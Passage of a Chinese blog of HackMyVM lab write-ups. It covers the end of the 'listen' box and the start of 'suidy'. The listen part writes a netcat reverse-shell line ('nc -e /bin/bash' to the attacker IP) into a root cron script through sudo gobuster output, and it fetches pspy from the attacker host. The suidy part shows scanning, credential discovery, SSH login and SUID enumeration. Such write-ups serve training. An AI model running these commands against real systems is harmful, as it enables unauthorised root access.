<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">welcome@listen:~$ wget <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">1</span>5--  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.1</span>s    </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">15</span> (<span class="number">30.4</span> MB<span class="operator">/</span>s) <span class="operator">-</span> ‘pspy64’ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">welcome@listen:~$ chmod <span class="number">777</span> pspy64</span><br><span class="line">welcome@listen:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2047</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2048</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2049</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2050</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2051</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2052</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br></pre></td></tr></table></figure></div>
<p>看到root会定时写入&#x2F;opt&#x2F;.test.sh<br>所以我们的目标就是在.test.sh中写入文件 （反弹shell）<br>大佬们的思路太nb了,就是利用gobuster输出结果的回显来写入命令<br>具体是这样的: 在本机开http服务,创建文件夹，在靶机用gobuster自己创一个字典，指向我们在本机的文件夹，这样就会显示靶机中字典文件中的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"> ──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# touch a</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /f7c3be62-4f83-404f-9236-89f88603c3f8 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /a HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ touch a.txt     </span><br><span class="line">welcome@listen:/tmp$ echo <span class="string">&quot;a&quot;</span> &gt; a.txt </span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">/a</span><br></pre></td></tr></table></figure></div>
<p>因为gobuster找到字典中可以访问的目录就会显示 <code>-q -n</code>是为了不输出banner和状态码<br>这样字我们就可以写反弹shell了 用-o将结果输出到&#x2F;opt&#x2F;.test.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># touch b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e /bin/bash 192.168.240.83 1234 &quot;</span> &gt; b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">777</span> b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;tmp/b&quot;</span> &gt; b.txt</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo gobuster -u <span class="number">192.168</span>.<span class="number">240.83</span> -w b.txt -q -n -o ┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="symbol">bash:</span> syntax error near unexpected token `(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">2025/02/05 05:42:21 [!] unable to connect to http://192.168.240.83/: Get http://192.168.240.83/: dial tcp 192.168.240.83:80: connect: connection refused</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br></pre></td></tr></table></figure></div>
<p>用我这种方式扫目录，要在本机主目录下开http，不然没有tmp目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# nc -lp 1234              </span><br><span class="line">id</span><br><span class="line">  </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>

<p>总结：1 wordpress的插件扫描以及常见的利用 2 gobuster或者目录扫描工具的读取敏感文件通用思路</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-suidy</title>
    <url>/posts/11143.html</url>
    <content><![CDATA[<p>HMV-suidy靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a81f4bd0e0a243d4fd3463.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.169 -p-</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">09</span> <span class="number">11</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.169</span> (<span class="number">192.168</span>.<span class="number">179.169</span>)</span><br><span class="line">Host is up (<span class="number">0.0014</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">8</span>a:cb:<span class="number">7</span>e:<span class="number">8</span>a:<span class="number">72</span>:<span class="number">82</span>:<span class="number">84</span>:<span class="number">9</span>a:<span class="number">11</span>:<span class="number">43</span>:<span class="number">61</span>:<span class="number">15</span>:c1:e6:<span class="number">32</span>:<span class="number">0</span>b (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">7</span>a:<span class="number">0</span>e:b6:dd:<span class="number">8</span>f:ee:a7:<span class="number">70</span>:d9:b1:b5:<span class="number">6</span>e:<span class="number">44</span>:<span class="number">8</span>f:c0:<span class="number">49</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">80</span>:<span class="number">18</span>:e6:c7:<span class="number">01</span>:<span class="number">0</span>e:c6:<span class="number">6</span>d:<span class="number">7</span>d:f4:d2:<span class="number">9</span>f:c9:d0:<span class="number">6</span>f:<span class="number">4</span>c (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">MAC <span class="params">Address:</span> AA:<span class="number">6</span>D:<span class="number">30</span>:<span class="number">09</span>:<span class="number">71</span>:E8 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.39</span> ms <span class="number">192.168</span>.<span class="number">179.169</span> (<span class="number">192.168</span>.<span class="number">179.169</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">9.93</span> seconds</span><br></pre></td></tr></table></figure></div>


<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.169                                                         </span><br><span class="line">hi</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- hi again --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>目录扫一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u 192.168.179.169 -w /usr/share/wordlists/dirb/common.txt </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.169</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 22]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 362]</span><br><span class="line"><span class="section">Progress: 4614 / 4615 (99.98%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.169/robots.txt</span><br><span class="line">/hi</span><br><span class="line">/....\..\.-\--.\.-\..\-.</span><br><span class="line">/shehatesme</span><br></pre></td></tr></table></figure></div>
<p>扫到一个robots.txt 访问发现是一个摩斯密码和一个shehatesme，解密 解密时候的结果是hi again<br>那目标就是第二行的内容了<br>在web访问这个目录，出现一段话</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">She hates me because I FOUND THE REAL SECRET! I <span class="built_in">put</span> <span class="keyword">in</span> this <span class="built_in">directory</span> <span class="keyword">a</span> lot <span class="keyword">of</span> .txt <span class="built_in">files</span>. <span class="literal">ONE</span> <span class="keyword">of</span> .txt <span class="built_in">files</span> <span class="keyword">contains</span> credentials like <span class="string">&quot;theuser/thepass&quot;</span> <span class="built_in">to</span> access <span class="built_in">to</span> her <span class="keyword">system</span>! All that you need is <span class="keyword">an</span> small dict <span class="built_in">from</span> Seclist!</span><br></pre></td></tr></table></figure></div>
<p>告诉了应该在这个目录扫描，字典都和我们说了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u 192.168.179.169/shehatesme -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.169/shehatesme</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 229]</span><br><span class="line">/.                    (Status: 301) [Size: 185] [--&gt; http://192.168.179.169/shehatesme/./]</span><br><span class="line">/search.txt           (Status: 200) [Size: 16]</span><br><span class="line"><span class="section">Progress: 11424 / 11425 (99.99%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.169/shehatesme/search.txt</span><br><span class="line">jaime11/JKiufg6</span><br></pre></td></tr></table></figure></div>
<p>给了一个用户名和密码，尝试登录,但是登录不上去，用一开始&#x2F;shehatesme目录中的账号密码登录成功</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh jaime11@<span class="number">192.168</span>.<span class="number">179.169</span>                                                                      </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.179.169 (192.168.179.169)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:e/Y+QbyX33+qoiZpch9G5Mgf32Y1Cj2eBFPlMp3Qx10.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.179.169&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">jaime11@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Permission denied, please <span class="keyword">try</span> again.</span><br><span class="line">jaime11@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh theuser@<span class="number">192.168</span>.<span class="number">179.169</span></span><br><span class="line">theuser@<span class="number">192.168</span>.<span class="number">179.169</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux suidy <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Sep <span class="number">27</span> <span class="number">00</span>:<span class="number">41</span>:<span class="number">28</span> <span class="number">2020</span></span><br><span class="line">-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-<span class="number">8</span>)</span><br><span class="line">theuser@suidy:~$ </span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现一个家目录下面的文件有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidy</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/suidy</span><span class="regexp">/suidyyyyy</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home</span><span class="variable">$ </span>cd suidy/</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt </span><br><span class="line">I love <span class="title class_">SUID</span> files!</span><br><span class="line"><span class="title class_">The</span> best file is suidyyyyy because users can <span class="keyword">use</span> it to feel as I feel.</span><br><span class="line">root know it <span class="keyword">and</span> run an script to be sure that my file has <span class="title class_">SUID</span>. </span><br><span class="line"><span class="title class_">If</span> you are <span class="string">&quot;theuser&quot;</span> I hate you!</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home</span><span class="variable">$ </span>cd suidy/</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt </span><br><span class="line">I love <span class="title class_">SUID</span> files!</span><br><span class="line"><span class="title class_">The</span> best file is suidyyyyy because users can <span class="keyword">use</span> it to feel as I feel.</span><br><span class="line">root know it <span class="keyword">and</span> run an script to be sure that my file has <span class="title class_">SUID</span>. </span><br><span class="line"><span class="title class_">If</span> you are <span class="string">&quot;theuser&quot;</span> I hate you!</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">suidy</span>@suidy:/home/suidy$ file suidyyyyy </span><br><span class="line"><span class="attribute">suidyyyyy</span>: setuid, setgid ELF <span class="number">64</span>-bit LSB pie executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha1]=a68ca005dccaf529f434e0408b05dc8614758fb7, not stripped</span><br></pre></td></tr></table></figure></div>
<p>这个文件是一个可执行文件，并且有权限执行,而且发现执行之后我的用户就变成suidy了<br>下载到本地看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# scp theuser<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">169</span>:/home/suidy/suidyyyyy .</span><br><span class="line">theuser<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">169</span>&#x27;s password: </span><br><span class="line">suidyyyyy                                                                        <span class="number">100</span>%   <span class="number">16</span>KB   <span class="number">2.3</span>MB/s   <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# strings suidyyyyy                                  </span><br><span class="line">/lib<span class="number">64</span>/ld-linux-<span class="keyword">x</span><span class="number">86</span><span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_<span class="number">2.2</span>.<span class="number">5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="comment">;*3$&quot;</span></span><br><span class="line">GCC: (Debian <span class="number">8.3</span>.<span class="number">0</span><span class="number">-6</span>) <span class="number">8.3</span>.<span class="number">0</span></span><br><span class="line">crtstuff.<span class="keyword">c</span></span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">7325</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__libc_start_main@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">__cxa_finalize@<span class="title">@GLIBC_2.2.5</span></span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span 